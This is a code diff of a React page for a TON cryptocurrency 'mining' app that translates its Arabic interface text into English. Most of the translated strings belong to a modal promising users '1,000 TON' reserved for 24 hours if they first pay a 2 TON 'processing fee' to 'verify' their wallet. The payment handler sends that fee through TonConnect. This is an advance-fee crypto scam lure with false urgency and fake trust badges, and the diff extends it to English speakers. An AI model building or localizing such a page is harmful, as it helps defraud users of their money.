@@ -69,6 +69,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
     // Restore mining state
     restoreMiningState(currentMiningSpeed);
   }, []);
+
   const restoreMiningState = (currentMiningSpeed: number) => {
     const miningStartTime = localStorage.getItem('miningStartTime');
     const miningDuration = localStorage.getItem('miningDuration');
@@ -126,6 +127,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
       }
     }
   };
+
   const completeMiningSession = (duration: number, currentMiningSpeed: number, lastProcessed: number, sessionEndTime: number) => {
     setMiningActive(false);
     setRemainingTime(28800);
@@ -140,6 +142,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
     }
     resetMiningState();
   };
+
   const resetMiningState = () => {
     localStorage.removeItem('miningStartTime');
     localStorage.removeItem('miningDuration');
@@ -205,6 +208,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
   useEffect(() => {
     localStorage.setItem('miningActive', miningActive.toString());
   }, [miningActive]);
+
   const handleStartMining = () => {
     if (!miningActive && remainingTime > 0) {
       const currentTime = Date.now();
@@ -222,6 +226,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
       lastProcessedTimeRef.current = currentTime;
     }
   };
+
   const formatTime = (timeInSeconds: number): string => {
     const hours = Math.floor(timeInSeconds / 3600);
     const minutes = Math.floor(timeInSeconds % 3600 / 60);
@@ -261,8 +266,8 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
   const handlePayment = async () => {
     if (!tonConnectUI.wallet) {
       toast({
-        title: 'محفظة غير متصلة',
-        description: 'يرجى ربط محفظة TON أولاً من صفحة المحفظة',
+        title: 'Wallet Not Connected',
+        description: 'Please connect your TON wallet first from the wallet page',
         variant: "destructive"
       });
       return;
@@ -287,8 +292,8 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
       console.log('Payment transaction sent:', result);
       
       toast({
-        title: '✅ تم إرسال الدفع بنجاح!',
-        description: 'تم إرسال 2 تون بنجاح. سيتم معالجة مكافأتك قريباً.',
+        title: '✅ Payment Sent Successfully!',
+        description: '2 TON has been sent successfully. Your reward will be processed soon.',
       });
       
       setShow100kModal(false);
@@ -299,18 +304,18 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
     } catch (error) {
       console.error('Payment failed:', error);
       
-      let errorMessage = 'فشل في إرسال المعاملة. يرجى المحاولة مرة أخرى.';
+      let errorMessage = 'Failed to send transaction. Please try again.';
       
       if (error instanceof Error) {
         if (error.message.includes('User declined')) {
-          errorMessage = 'تم إلغاء المعاملة من قبل المستخدم.';
+          errorMessage = 'Transaction was cancelled by user.';
         } else if (error.message.includes('insufficient funds')) {
-          errorMessage = 'رصيد غير كافي في المحفظة.';
+          errorMessage = 'Insufficient funds in wallet.';
         }
       }
       
       toast({
-        title: 'فشل في الدفع',
+        title: 'Payment Failed',
         description: errorMessage,
         variant: "destructive"
       });
@@ -444,7 +449,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
         )}
       </div>
 
-      {/* 100k User Event Modal - Updated with real payment */}
+      {/* 100k User Event Modal - Updated with English text */}
       <Dialog open={show100kModal} onOpenChange={setShow100kModal}>
         <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-sm mx-auto">
           <DialogHeader>
@@ -456,10 +461,10 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
           <div className="space-y-3 text-center">
             <div className="bg-black/30 rounded-lg p-3 border border-gold-400/30">
               <h3 className="text-md font-bold text-gold-400 mb-1">
-                تهانينا!
+                Congratulations!
               </h3>
               <p className="text-xs text-gray-300">
-                لقد حققت إنجازاً مميزاً!
+                You've achieved something special!
               </p>
             </div>
 
@@ -468,21 +473,21 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
                 <span className="text-2xl">💎</span>
                 <span className="text-xl font-bold text-green-400">1,000 TON</span>
               </div>
-              <p className="text-xs text-gray-300">محجوز لك!</p>
+              <p className="text-xs text-gray-300">Reserved for you!</p>
             </div>
 
             <div className="bg-yellow-900/40 rounded-lg p-2 border border-yellow-400/30">
               <p className="text-xs text-yellow-200">
-                ⏰ صالح لمدة 24 ساعة فقط
+                ⏰ Valid for 24 hours only
               </p>
             </div>
 
             <div className="bg-blue-900/40 rounded-lg p-3 border border-blue-400/30">
               <p className="text-xs text-gray-300 mb-2">
-                رسوم المعالجة: 2 تون مطلوبة للتحقق من محفظتك
+                Processing fee: 2 TON required to verify your wallet
               </p>
               <p className="text-xs text-blue-200">
-                يساعد في منع البوتات والحفاظ على أمان المنصة.
+                Helps prevent bots and maintain platform security.
               </p>
             </div>
 
@@ -495,12 +500,12 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
                 {isProcessingPayment ? (
                   <div className="flex items-center gap-2">
                     <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
-                    <span>جاري المعالجة...</span>
+                    <span>Processing...</span>
                   </div>
                 ) : !tonConnectUI.wallet ? (
-                  <span>🔗 اربط المحفظة أولاً</span>
+                  <span>🔗 Connect Wallet First</span>
                 ) : (
-                  <span>💳 ادفع 2 تون واحصل على 1,000 تون</span>
+                  <span>💳 Pay 2 TON & Get 1,000 TON</span>
                 )}
               </Button>
               
@@ -510,12 +515,12 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
                 className="w-full border-gray-400 text-gray-300 hover:bg-gray-800 text-sm py-2"
                 disabled={isProcessingPayment}
               >
-                ربما لاحقاً
+                Maybe Later
               </Button>
             </div>
 
             <div className="text-xs text-gray-400 pt-1">
-              <p>🔐 آمن • 🌟 موثوق • ⚡ مدعوم بالبلوك تشين</p>
+              <p>🔐 Secure • 🌟 Trusted • ⚡ Blockchain Powered</p>
             </div>
           </div>
         </DialogContent>
